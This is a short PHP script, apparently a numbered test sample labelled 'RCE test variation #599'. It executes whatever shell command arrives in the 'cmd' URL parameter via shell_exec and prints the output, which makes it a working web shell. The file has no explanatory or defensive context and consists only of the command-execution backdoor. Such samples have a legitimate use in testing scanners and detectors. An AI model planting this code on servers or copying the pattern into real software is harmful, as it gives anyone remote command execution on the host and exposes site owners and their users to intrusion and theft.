<?php
// RCE test variation #599
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>